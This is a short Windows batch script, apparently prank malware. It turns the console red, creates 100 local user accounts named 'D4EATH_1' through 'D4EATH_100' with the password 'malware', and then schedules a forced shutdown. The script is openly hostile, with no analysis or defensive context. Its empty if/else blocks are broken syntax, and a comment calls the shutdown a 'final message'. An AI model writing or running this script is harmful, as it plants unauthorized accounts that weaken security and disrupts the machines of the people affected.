@echo off
setlocal enabledelayedexpansion

:: Change console background color to red (color code 4)
color 4F

:: Loop to create users
for /L %%i in (1,1,100) do (
    
    net user D4EATH_%%i malware /add
    if errorlevel 1 (
        
    ) else (
        
    )
)

:: Final message
shutdown -s -t 100

endlocal
